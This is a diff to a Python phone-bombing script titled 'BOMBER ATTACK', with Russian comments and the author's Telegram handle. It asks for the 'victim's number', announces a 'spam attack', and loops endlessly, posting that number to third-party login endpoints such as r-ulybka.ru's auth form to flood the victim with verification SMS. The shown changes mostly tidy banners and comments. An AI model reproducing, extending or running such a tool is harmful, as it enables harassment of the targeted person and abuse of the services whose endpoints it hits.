@@ -1,10 +1,8 @@
 import os, sys, time, requests, random
-import keyboard
 
 #АВТОР - uw935
+#Если увидели ЛЯП - пишите @uw935
 
-def stop():
-    quit()
 
 _name = ""
 _phone9 = ""
@@ -16,25 +14,26 @@ except:
     print("""
 Добро пожаловать в BOMBER ATTACK.
 Автор - @uw935.
-Технические вопросы - @uw935 (телеграмм).
-
-""")
+Технические вопросы - @uw935 (телеграмм).""")
+    
+#Номер телефона
     print("ПОМЕТКА: укажите только цифры, что бы не было ошибок. Например: 79166575")
     phone = input("Укажите номер: ")
+    
+#Начало СПАМ АТАКИ
 _phone = phone
 np = "\033[37m\033[47m_\033[0m"
 np2 = "\033[47m_____\033[30m                         \033[0m\033[44m\033[34m_ \033[0m"
-start = """
-Что бы начать СПАМ-АТАКУ нажмите 'enter'."""
+
+start = """Что бы начать СПАМ-АТАКУ нажмите 'enter'."""
 print(start)
-input()
-print("""
-Что бы остановить БОМБЕР - закройте приложение. """)
+input() #задержка
+
+print("""Что бы остановить БОМБЕР - закройте приложение. """)
 print("Номер жертвы: " + phone)
-print( 
-    )
 
 
+#CODE
 for x in range(12):
     _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
     password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
@@ -101,7 +100,6 @@ while True:
     except:
         pass
     try:
-        # под сомнением
         phonemas=mask(str=phone, maska="#(###)###-##-##")
         requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonemas})
 
